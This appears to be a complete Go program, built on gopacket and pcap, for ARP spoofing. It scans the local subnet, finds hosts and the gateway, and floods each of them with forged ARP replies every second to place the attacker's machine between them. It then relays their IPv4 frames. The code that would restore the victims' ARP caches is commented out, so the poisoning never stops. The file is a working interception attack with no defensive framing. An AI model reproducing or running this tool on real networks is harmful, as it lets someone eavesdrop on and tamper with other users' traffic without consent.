package main

import (
	"bytes"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type AddressPair struct {
	DstHwAddress   []byte
	DstProtAddress []byte
	SrcHwAddress   []byte
	SrcProtAddress []byte
}

type Host struct {
	IP      []byte
	MAC     []byte
	Netmask []byte
}

type Session struct {
	Sender   *Host
	Receiver *Host
}

var (
	snapshotLen = int32(1024)
	promiscuous = false
	timeout     = time.Minute

	options gopacket.SerializeOptions

	broadcast = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	zerofill  = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	device pcap.Interface
)

func main() {
	device = selectDeviceFromUser()

	attacker := &Host{}
	attacker.getLocalhostInfomation(device)

	// go parse(device)

	for session := range attacker.getSessionChan() {
		log.Println("Session Detected.", session)
		go session.infect(attacker)
		go session.relay(attacker)
	}
}

func selectDeviceFromUser() pcap.Interface {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(">> Please select the network card to sniff packets.")
	for i, device := range devices {
		fmt.Printf("\n%d. Name : %s\n   Description : %s\n   IP address : %v\n",
			i+1, device.Name, device.Description, device.Addresses)
	}
	var selected int
	fmt.Print("\n>> ")
	fmt.Scanf("%d", &selected)
	if selected < 0 || selected > len(devices) {
		log.Panic("Invaild Selected.")
	}
	return devices[selected-1]
}

func openPcap(device pcap.Interface) *pcap.Handle {
	handle, err := pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
	if err != nil {
		os.Exit(1)
	}
	return handle
}

func (h *Host) getLocalhostInfomation(device pcap.Interface) {
	for _, inf := range device.Addresses {
		if len(inf.IP) == 4 {
			h.IP = inf.IP
			h.Netmask = inf.Netmask
		}
	}
	infs, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	for _, inf := range infs {
		addrs, err := inf.Addrs()
		if err != nil {
			fmt.Println(err)
			continue
		}
		ip := []byte{}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				ip = []byte(v.IP)[len(v.IP)-4:]
				break
			}
		}
		if bytes.Equal([]byte(ip), h.IP) {
			h.MAC = []byte(inf.HardwareAddr)
		}
	}
}

// only work on C class
func (h *Host) getSessionChan() (ch chan *Session) {
	ch = make(chan *Session)
	prefixSize, _ := net.IPMask(h.Netmask).Size()
	cidr := net.IP(h.IP).String() + "/" + strconv.Itoa(prefixSize)
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		close(ch)
		return
	}
	inc := func(ip net.IP) {
		for i := len(ip) - 1; i >= 0; i-- {
			ip[i]++
			if ip[i] > 0 {
				break
			}
		}
	}
	hostInNetwork := []net.IP{}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ipCopy := make(net.IP, len(ip))
		copy(ipCopy, ip)
		if bytes.Equal(h.IP, ipCopy) {
			continue
		}
		hostInNetwork = append(hostInNetwork, ipCopy)
	}

	hostInNetwork = hostInNetwork[1 : len(hostInNetwork)-1]
	go recvARP(hostInNetwork, ch)
	go h.infinitySendARP(hostInNetwork)

	return
}

func (h *Host) infinitySendARP(IPs []net.IP) {
	handle := openPcap(device)
	defer handle.Close()

	for len(IPs) > 0 {
		for _, IP := range IPs {
			sendARP(handle, &AddressPair{
				DstProtAddress: IP,
				DstHwAddress:   broadcast,
				SrcProtAddress: h.IP,
				SrcHwAddress:   h.MAC,
			}, layers.ARPRequest)
		}
		time.Sleep(time.Second * 10)
	}
}

// func (s *Session) recovery(attacker *Host) {
// 	handle := openPcap(device)
// 	defer handle.Close()

// 	ticker1sec := time.Tick(time.Second * 1)
// 	ticker10sec := time.Tick(time.Second * 10)
// 	for {
// 		select {
// 		case <-ticker1sec:
// 			sendARP(handle, &AddressPair{
// 				DstProtAddress: s.Sender.IP,
// 				DstHwAddress:   s.Sender.MAC,
// 				SrcProtAddress: attacker.IP,
// 				SrcHwAddress:   attacker.MAC,
// 			}, layers.ARPReply)
// 			sendARP(handle, &AddressPair{
// 				DstProtAddress: s.Receiver.IP,
// 				DstHwAddress:   s.Receiver.MAC,
// 				SrcProtAddress: s.Sender.IP,
// 				SrcHwAddress:   s.Sender.MAC,
// 			}, layers.ARPReply)
// 		case <-ticker10sec:
// 			log.Println("Recovered.", s)
// 			return
// 		}
// 	}
// }

func (s *Session) infect(attacker *Host) {
	handle := openPcap(device)
	defer handle.Close()

	ticker1sec := time.Tick(time.Second * 1)
	// ticker3min := time.Tick(time.Minute * 3)
	log.Println("Infection Start.", s)
	for {
		select {
		case <-ticker1sec:
			sendARP(handle, &AddressPair{
				DstProtAddress: s.Sender.IP,
				DstHwAddress:   s.Sender.MAC,
				SrcProtAddress: s.Receiver.IP,
				SrcHwAddress:   attacker.MAC,
			}, layers.ARPReply)
			sendARP(handle, &AddressPair{
				DstProtAddress: s.Receiver.IP,
				DstHwAddress:   s.Receiver.MAC,
				SrcProtAddress: s.Sender.IP,
				SrcHwAddress:   attacker.MAC,
			}, layers.ARPReply)
			// case <-ticker3min:
			// 	log.Println("Infection End.", s)
			// 	s.recovery(attacker)
			// 	return
		}
	}
}

func (s *Session) relay(attacker *Host) {
	handle := openPcap(device)
	defer handle.Close()

	var eth layers.Ethernet

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth)
		decoded := []gopacket.LayerType{}
		parser.DecodeLayers(packet.Data(), &decoded)
		for _, layerType := range decoded {
			if layerType == layers.LayerTypeEthernet {
				if eth.EthernetType != layers.EthernetTypeIPv4 {
					continue
				}
				switch {
				case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
					// fmt.Print(">")
					eth.DstMAC = s.Receiver.MAC
					eth.SrcMAC = attacker.MAC
				case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
					// fmt.Print("<")
					eth.DstMAC = s.Sender.MAC
					eth.SrcMAC = attacker.MAC
				default:
					continue
				}

				buffer := gopacket.NewSerializeBuffer()
				gopacket.SerializeLayers(buffer, options,
					&eth,
					gopacket.Payload(eth.Payload),
				)
				outgoingPacket := buffer.Bytes()
				handle.WritePacketData(outgoingPacket)
			}
		}
	}
}

func recvARP(IPs []net.IP, ch chan *Session) {
	handle := openPcap(device)
	defer handle.Close()

	defer close(ch)
	gateway := &Host{IP: IPs[0]}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			arp := arpLayer.(*layers.ARP)
			if bytes.Equal(arp.SourceProtAddress, gateway.IP) {
				gateway.MAC = arp.SourceHwAddress
				break
			}
		}
	}
	IPs = IPs[1:]
	match := func(IPs []net.IP, targetIP net.IP) (bool, int) {
		for i, IP := range IPs {
			if bytes.Equal(IP, targetIP) {
				return true, i
			}
		}
		return false, -1
	}

	var eth layers.Ethernet
	var arp layers.ARP

	for packet := range packetSource.Packets() {
		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
			&eth, &arp)
		decoded := []gopacket.LayerType{}
		parser.DecodeLayers(packet.Data(), &decoded)
		for _, layerType := range decoded {
			switch layerType {
			case layers.LayerTypeARP:
				if arp.Operation != layers.ARPReply {
					continue
				}
				if ok, i := match(IPs, arp.SourceProtAddress); ok {
					sender := &Host{
						IP:  arp.SourceProtAddress,
						MAC: arp.SourceHwAddress,
					}
					ch <- &Session{Sender: sender, Receiver: gateway}
					IPs = append(IPs[:i], IPs[i+1:]...)
				}
			}
		}
	}
}

func sendARP(handle *pcap.Handle, addressPair *AddressPair, operation uint16) {
	arpLayer := &layers.ARP{
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   byte(6),
		ProtAddressSize: byte(4),
		DstHwAddress: func() []byte {
			if bytes.Equal(addressPair.DstHwAddress, broadcast) {
				return zerofill
			}
			return addressPair.DstHwAddress
		}(),
		DstProtAddress:    addressPair.DstProtAddress,
		SourceHwAddress:   addressPair.SrcHwAddress,
		SourceProtAddress: addressPair.SrcProtAddress,
		Operation:         operation,
	}
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr(addressPair.SrcHwAddress),
		DstMAC:       net.HardwareAddr(addressPair.DstHwAddress),
		EthernetType: layers.EthernetTypeARP,
	}
	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		arpLayer,
	)
	outgoingPacket := buffer.Bytes()
	handle.WritePacketData(outgoingPacket)
}

func (s *Session) String() string {
	return fmt.Sprint(s.Sender.String(), " <-> ", s.Receiver.String())
}

func (h *Host) String() string {
	return "IP:" + net.IP(h.IP).String() + " " + func() string {
		if len(h.MAC) == 0 {
			return ""
		}
		bufs := []string{}
		for _, v := range h.MAC {
			bufs = append(bufs, fmt.Sprintf("%02x", v))
		}
		return "MAC:" + strings.Join(bufs, ":")
	}()
}

func dump(_bytes []byte) {
	var b bytes.Buffer
	for i := range _bytes {
		fmt.Fprintf(&b, "%02x ", _bytes[i])
		i := i + 1
		if i != 0 && i%16 == 0 {
			fmt.Fprintf(&b, "\n")
		} else if i != 0 && i%8 == 0 {
			fmt.Fprintf(&b, " ")
		}
	}
	fmt.Println(b.String())
}
